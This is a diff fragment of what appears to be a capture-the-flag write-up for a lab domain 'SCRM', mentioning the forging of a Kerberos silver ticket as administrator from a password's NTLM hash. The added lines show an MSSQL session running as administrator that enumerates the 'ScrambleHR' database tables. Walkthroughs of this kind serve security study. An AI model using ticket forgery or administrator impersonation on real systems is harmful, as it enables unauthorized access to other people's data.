@@ -273,7 +273,7 @@ For some odd reason it is not letting me authenticate to the service
 
 Now looking back at the PDF access has been restricted on it only administrators can access
 
-# Silver ticket
+# Silver ticket to access 
 Since only admins can access the database ill forge a ticket as an administrator
 
 First ill get the NTLM hash of `Pegasus60
@@ -361,6 +361,19 @@ ScrambleHR
 SQL (SCRM\administrator  dbo@master)> 
 ```
 Non default database `ScrambleHR`
+
+```python
+SQL (SCRM\administrator  dbo@master)> USE ScrambleHR
+ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
+INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
+SQL (SCRM\administrator  dbo@ScrambleHR)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'
+TABLE_NAME   
+----------   
+Employees    
+UserImport   
+Timesheets   
+```
+3 tables
 
 ```python
 
